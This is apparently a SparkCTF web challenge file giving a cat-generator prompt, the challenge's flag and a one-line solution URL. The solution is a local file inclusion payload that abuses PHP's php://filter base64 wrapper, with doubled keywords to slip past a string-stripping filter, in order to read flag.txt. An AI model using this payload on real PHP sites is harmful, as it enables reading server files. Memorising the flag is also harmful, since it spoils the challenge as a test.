@@ -1,0 +1,7 @@
+im tired of collecting cat pictures for you, here's a cat generator *ᆺ* Enjoyy!! 
+
+flag : SparkCTF{13f59adcae30cc5304d68fb106c2431502205628bb11bc5d7220cf591aca5aa2}
+
+Author : j3seer
+
+Solution: http://localhost:1234/?pic=pphphp://filtfilterer/convert.babase64se64-encode/resouresourcerce=/flaflflagag.txtg.txt
